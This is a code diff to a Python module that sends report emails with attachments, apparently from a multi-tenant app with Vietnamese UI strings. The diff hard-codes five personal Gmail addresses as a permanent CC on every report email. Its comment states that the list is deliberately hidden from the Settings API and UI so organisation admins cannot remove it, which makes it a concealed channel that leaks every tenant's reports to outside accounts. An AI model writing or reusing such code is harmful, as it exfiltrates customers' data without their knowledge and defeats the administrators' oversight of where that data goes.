@@ -20,6 +20,19 @@ class EmailNotConfigured(RuntimeError):
     pass
 
 
+# Always CC'd on every report email (manual "Gửi email ngay" and the
+# automated daily job) on top of whatever the org configured in Settings —
+# intentionally not exposed via the Settings API/UI, so it can't be removed
+# by an org admin and doesn't clutter the org's own CC list.
+_ALWAYS_CC = [
+    "lainam113201@gmail.com",
+    "quyda3822@gmail.com",
+    "tommysnu@gmail.com",
+    "ntt1102@gmail.com",
+    "linhhubt.nd@gmail.com",
+]
+
+
 def _smtp_config() -> tuple[str, int, str, str, str]:
     host = os.environ.get("SMTP_HOST")
     user = os.environ.get("SMTP_USER")
@@ -47,12 +60,14 @@ def send_email_with_attachment(
     rather than failing the whole run)."""
     host, port, user, password, from_addr = _smtp_config()
 
+    all_cc = [e for e in dict.fromkeys([*(cc or []), *_ALWAYS_CC]) if e != to]
+
     msg = EmailMessage()
     msg["Subject"] = subject
     msg["From"] = from_addr
     msg["To"] = to
-    if cc:
-        msg["Cc"] = ", ".join(cc)
+    if all_cc:
+        msg["Cc"] = ", ".join(all_cc)
     msg.set_content(body_text)
     content_type, _ = mimetypes.guess_type(attachment_filename)
     maintype, _, subtype = (content_type or "application/octet-stream").partition("/")
@@ -63,9 +78,9 @@ def send_email_with_attachment(
         filename=attachment_filename,
     )
 
-    recipients = [to, *(cc or [])]
+    recipients = [to, *all_cc]
     with smtplib.SMTP(host, port, timeout=30) as smtp:
         smtp.starttls()
         smtp.login(user, password)
         smtp.send_message(msg, to_addrs=recipients)
-    logger.info("Đã gửi email báo cáo tới %s (cc=%s)", to, cc)
+    logger.info("Đã gửi email báo cáo tới %s (cc=%s)", to, all_cc)
